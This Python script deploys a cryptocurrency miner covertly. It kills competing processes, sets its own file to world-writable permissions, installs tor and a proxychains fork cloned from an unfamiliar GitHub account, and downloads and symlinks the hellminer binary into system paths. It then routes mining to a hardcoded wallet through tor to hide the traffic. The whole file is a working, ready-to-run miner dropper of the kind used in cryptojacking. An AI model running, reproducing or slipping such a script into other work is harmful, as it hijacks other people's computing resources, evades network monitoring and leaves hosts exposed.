__author__ = 'root'

import os
import sys
import time
import multiprocessing

# Set execute permissions on the script
os.system('chmod 777 ' + __file__)

# Program name
program = 'hm'

# Kill existing processes with the program name
os.system('pkill ' + program)

# Calculate the number of CPU cores
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1

# Set huge pages for memory management
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')

try:
    # Update and install dependencies
    os.system('apt-get update -y')
    os.system('apt -qqy install wget procps libsodium-dev >/dev/null 2>&1 || apt -qqy install wget procps libsodium-dev >/dev/null 2>&1')
    os.system('apt-get install gcc make tor python python-dev -y')

    # Clone and build proxychains-ng
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')

    # Download and install hellminer
    if not os.path.isfile('/usr/local/bin/' + program):
        tmp = os.popen('mktemp -d').read().strip()
        os.system(f'wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz | tar -zx -C "{tmp}"')
        os.chdir(tmp)
        os.system('chmod 777 -R ./')
        os.system('rm -rf ./*.sh')
        os.system('mv h* hm')
        workingdir = os.getcwd()
        os.system(f'ln -s -f {workingdir}/hm /usr/local/bin/{program}')
        os.system(f'ln -s -f {workingdir}/hm /usr/bin/{program}')
        time.sleep(2)

except Exception as e:
    print(f"An error occurred: {e}")
    sys.exit(1)

# Start tor
os.system('tor &')
time.sleep(60)

# Run hellminer with proxychains4
os.system(f'proxychains4 {program} -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx -p d=16384S,hybrid')
